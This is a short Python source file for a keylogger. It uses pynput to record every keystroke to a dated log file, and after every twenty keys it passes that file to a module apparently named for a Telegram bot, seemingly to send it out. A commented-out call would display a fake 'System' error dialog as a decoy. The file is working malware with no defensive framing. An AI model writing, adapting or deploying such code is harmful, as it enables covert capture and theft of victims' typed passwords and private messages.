import datetime
from pynput.keyboard import Key, Listener
from tkinter import messagebox
import TBot as TB
import variables as v

global fp
keys = []
path = v.LogDir
date = datetime.date.today()
DocName = str(date) + ".txt"
fp = path+DocName
count = 0


def message():
    messagebox.showerror("System", v.tbmsg)


def writefile(keys):
    with open(fp, v.logFuncMode) as f:
        for key in keys:
            k = key.replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("enter") > 0:
                f.write('\n')
            else:
                f.write(k)


def onPress(key):
    global keys, count

    keys.append(f"{key}")
    count += 1
    print(f"{key} pressed")
    writefile(keys)
    if count > 20:
        TB.getID(fp)
        count = 0


def onRelease(key):
    if key == Key.esc:
        return False


def run():
    with Listener(on_press=onPress, on_release=onRelease) as listener:
        listener.join()


# message()
run()
